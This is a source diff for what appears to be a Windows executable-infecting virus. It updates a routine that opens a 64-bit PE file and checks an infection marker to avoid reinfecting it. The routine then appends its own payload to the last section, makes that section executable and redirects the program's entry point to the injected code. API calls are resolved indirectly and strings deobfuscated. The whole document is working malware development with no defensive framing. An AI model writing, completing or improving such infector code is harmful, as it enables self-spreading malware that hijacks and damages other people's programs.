@@ -81,14 +81,15 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
 
     HANDLE hFile, hMapFile;
     LPVOID pMapAddress;
-    DWORD dwFileSize, dwNewFileSize;
+    DWORD dwFileSize, dwFileAlignment, dwNewFileSize, dwSizeAligned;
 #ifndef SKIP_SIGN
     DWORD dwSignature;
 #endif
     PCIMAGE_DOS_HEADER pDosHeader;
     PIMAGE_NT_HEADERS64 pNtHeader;
     PIMAGE_SECTION_HEADER pSection, pLastSection;
-    DWORD dwLastSectionPtr, dwLastSectionSize, dwLastSectionRva, dwOrigEntryPoint, dwSizeAligned;
+    DWORD dwLastSectionPtr, dwLastSectionSize, dwLastSectionRva, dwLastSectionEnd, dwOrigEntryPoint;
+    WORD wNbSectionsMin1;
     PBYTE pPayloadData;
 
     do {
@@ -115,10 +116,56 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
         }
 
         dwFileSize = pGetFileSize(hFile, NULL);
-        dwNewFileSize = ALIGN(dwFileSize + ALIGN(code_size, 512), 512);
-        // ^ TODO: Get file alignment from PE header instead of hardcoding 512
-        //         Load file in read-only mode and reopen in RW later
-        //         Perform as many checks as possible in read-only mode
+
+        hMapFile = pCreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, dwFileSize, NULL);
+        if (hMapFile == NULL) {
+            // MSGBOX_DBG(DEOBF(errMapFile), NULL, MB_OK | MB_ICONERROR);
+            goto close_file;
+        }
+
+        pMapAddress = pMapViewOfFile(hMapFile, FILE_MAP_READ, 0, 0, 0);
+        if (pMapAddress == NULL) {
+            // MSGBOX_DBG(DEOBF(errMapFile), NULL, MB_OK | MB_ICONERROR);
+            goto close_map;
+        }
+
+        pDosHeader = (PCIMAGE_DOS_HEADER)pMapAddress;
+        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+            goto error;
+        }
+
+        pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
+        if (pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
+            pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
+            pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+            goto error;
+        }
+
+        dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;
+        wNbSectionsMin1 = pNtHeader->FileHeader.NumberOfSections - 1;
+        pSection = IMAGE_FIRST_SECTION(pNtHeader);
+        pLastSection = &pSection[wNbSectionsMin1];
+        dwLastSectionPtr = pLastSection->PointerToRawData;
+        dwLastSectionSize = pLastSection->SizeOfRawData;
+        dwLastSectionRva = pLastSection->VirtualAddress;
+        dwLastSectionEnd = dwLastSectionRva + dwLastSectionSize;
+        dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
+        dwSizeAligned = ALIGN(code_size, dwFileAlignment);
+        dwNewFileSize = ALIGN(dwFileSize + dwSizeAligned, dwFileAlignment);
+
+#ifndef SKIP_SIGN
+        if (dwOrigEntryPoint >= dwLastSectionRva && dwOrigEntryPoint < dwLastSectionEnd) {
+            dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwLastSectionPtr +
+                                     (dwOrigEntryPoint - dwLastSectionRva) -
+                                     ((PCBYTE)&payload - (PCBYTE)&signature));
+            if (dwSignature == signature) {
+                goto error;
+            }
+        }
+#endif
+
+        pUnmapViewOfFile(pMapAddress);
+        pCloseHandle(hMapFile);
 
         hMapFile = pCreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, dwNewFileSize, NULL);
         if (hMapFile == NULL) {
@@ -145,27 +192,9 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
         }
 
         pSection = IMAGE_FIRST_SECTION(pNtHeader);
-        pLastSection = &pSection[pNtHeader->FileHeader.NumberOfSections - 1];
-        dwLastSectionPtr = pLastSection->PointerToRawData;
-        dwLastSectionSize = pLastSection->SizeOfRawData;
-        dwLastSectionRva = pLastSection->VirtualAddress;
-        pPayloadData = (PBYTE)pDosHeader + dwLastSectionPtr + dwLastSectionSize;
-        dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
+        pLastSection = &pSection[wNbSectionsMin1];
+        pPayloadData = (PBYTE)pMapAddress + dwLastSectionPtr + dwLastSectionSize;
 
-#ifndef SKIP_SIGN
-        if (dwOrigEntryPoint >= dwLastSectionRva &&
-            dwOrigEntryPoint < dwLastSectionRva + dwLastSectionSize) {
-            dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwLastSectionPtr +
-                                     (dwOrigEntryPoint - dwLastSectionRva) -
-                                     ((PCBYTE)&payload - (PCBYTE)&signature));
-            if (dwSignature == signature) {
-                goto error;
-            }
-        }
-#endif
-
-        dwSizeAligned = ALIGN(code_size, pNtHeader->OptionalHeader.FileAlignment);
-        // ^ Compute aligned size earlier
         pLastSection->Misc.VirtualSize = dwLastSectionSize + code_size;
         pLastSection->SizeOfRawData += dwSizeAligned;
         pNtHeader->OptionalHeader.SizeOfCode += pLastSection->Characteristics & IMAGE_SCN_CNT_CODE
@@ -177,8 +206,7 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
         pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
         pLastSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
         pNtHeader->OptionalHeader.AddressOfEntryPoint =
-            dwLastSectionRva + dwLastSectionSize +
-            (LONG)((PCBYTE)&payload - (PCBYTE)&__payload_start);
+            dwLastSectionEnd + (LONG)((PCBYTE)&payload - (PCBYTE)&__payload_start);
 
         my_memcpy(pPayloadData, (PCBYTE)&__payload_start, code_size);
         *(PLONGLONG)(pPayloadData + ((PCBYTE)&delta_start - (PCBYTE)&__payload_start)) =
